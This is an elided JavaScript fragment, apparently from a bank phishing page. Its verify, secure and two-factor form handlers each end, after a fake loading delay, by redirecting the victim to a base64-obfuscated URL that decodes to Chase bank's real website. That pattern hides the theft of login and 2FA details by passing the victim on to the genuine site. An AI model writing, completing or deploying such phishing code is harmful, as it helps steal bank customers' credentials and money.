        ...
        if (verifyForm) {
            verifyForm.addEventListener('submit', e => {
                ...
                const processVerify = () => {
                    ...
                    setTimeout(() => { window.location.href = atob('aHR0cHM6Ly93d3cuY2hhc2UuY29t'); }, 1500);
                };
        ...
        if (secureForm) {
            secureForm.addEventListener('submit', e => {
                ...
                executeBankLoader(() => {
                    ...
                    window.location.href = atob('aHR0cHM6Ly93d3cuY2hhc2UuY29t');
                });
            });
        }
            ...
            tfaForm.addEventListener('submit', e => {
                ...
                setTimeout(() => {
                    if (reviewModal) {
                        ...
                        const redir = () => { window.location.href = atob('aHR0cHM6Ly93d3cuY2hhc2UuY29t'); };
